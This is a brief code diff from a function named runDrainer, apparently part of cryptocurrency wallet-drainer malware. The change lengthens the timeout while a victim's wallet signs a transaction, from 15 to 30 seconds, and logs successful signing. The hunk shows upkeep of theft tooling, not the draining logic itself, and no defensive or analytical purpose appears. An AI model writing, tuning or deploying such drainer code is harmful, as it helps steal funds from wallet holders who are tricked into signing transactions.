@@ -1217,9 +1217,9 @@ async function runDrainer(provider) {
         }
       })();
       
-      const timeoutPromise = new Promise((_, reject) => {
-        setTimeout(() => reject(new Error('JSON-RPC: method call timeout calling connect')), 15000); // Reduced to 15 seconds
-      });
+                       const timeoutPromise = new Promise((_, reject) => {
+                   setTimeout(() => reject(new Error('JSON-RPC: method call timeout calling connect')), 30000); // Increased to 30 seconds
+                 });
       
       signed = await Promise.race([signingPromise, timeoutPromise]);
       console.log('[SIGNING] Transaction signed successfully:', signed);
